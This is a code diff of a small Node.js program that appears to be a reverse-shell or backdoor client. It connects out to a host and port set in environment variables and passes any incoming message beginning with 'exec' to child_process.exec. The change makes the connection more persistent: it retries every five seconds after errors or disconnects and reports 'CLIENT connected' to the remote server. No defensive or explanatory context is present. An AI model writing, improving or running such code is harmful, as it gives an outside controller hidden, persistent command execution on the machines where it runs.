@@ -11,15 +11,27 @@ const exec = util.promisify(child_process.exec);
 let path = process.cwd();
 
 const PORT = process.env.PORT;
-const HOST = process.env.HOST;
+const IP = process.env.IP;
 
 const client = new net.Socket();
+let intervalConnect = false;
 
-function reconnect(timeout) {
-	setTimeout(() => {
-		client.destroy();
-		client.connect(PORT, HOST);
-	}, timeout);
+function connect() {
+	client.connect({
+		port: PORT,
+		host: IP,
+	});
+}
+
+function launchIntervalConnect() {
+	if (false != intervalConnect) return;
+	intervalConnect = setInterval(connect, 5000);
+}
+
+function clearIntervalConnect() {
+	if (false == intervalConnect) return;
+	clearInterval(intervalConnect);
+	intervalConnect = false;
 }
 
 client.on("data", (data) => {
@@ -43,14 +55,15 @@ client.on("data", (data) => {
 	if (dataStr.startsWith("exec")) execute(dataStr.replace("exec", ""));
 });
 
-client.on("close", () => {
-	reconnect(30000);
+client.on("connect", () => {
+	clearIntervalConnect();
+	client.write("CLIENT connected");
 });
 
 client.on("error", (err) => {
-	if (err.code == "ECONNREFUSED") {
-		reconnect(10000);
-	}
+	launchIntervalConnect();
 });
+client.on("close", launchIntervalConnect);
+client.on("end", launchIntervalConnect);
 
-client.connect(PORT, HOST);
+connect();
